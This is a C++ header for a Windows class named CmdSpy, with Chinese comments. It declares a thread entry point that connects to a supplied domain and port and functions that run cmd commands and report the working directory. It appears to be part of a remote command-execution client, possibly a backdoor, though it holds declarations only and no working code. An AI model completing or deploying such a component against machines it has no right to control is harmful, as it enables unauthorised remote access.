#pragma once
#ifndef CMDSPY_H
#define CMDSPY_H

#include "TcpSocket.h"
#include <windows.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <stdexcept>
#include <cstdlib>
#include <filesystem>
#include <direct.h>  // 对于 Windows 系统
class CmdSpy
{
public:
    CmdSpy();
    ~CmdSpy();

    // 客户端发送到服务端的指令
    const std::string CmdPwd = "PWD";    // 当前文件位置

    // 分割符和结束符号
    const std::string CmdSplit = ";";
    const std::string CmdEnd = "\r\n";



    // 这个类的入口函数
    static void startByNewThread(std::string domain, int port);



    static DWORD WINAPI threadProc(LPVOID args);
    static void startCmdSpy(std::string domain, int port);
    static void addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size);

    // 执行cmd指令
    static std::string execCmd(std::string cmd);
    // 获取当前位置
    static std::string getPWD();
};

#endif // CMDSPY_H


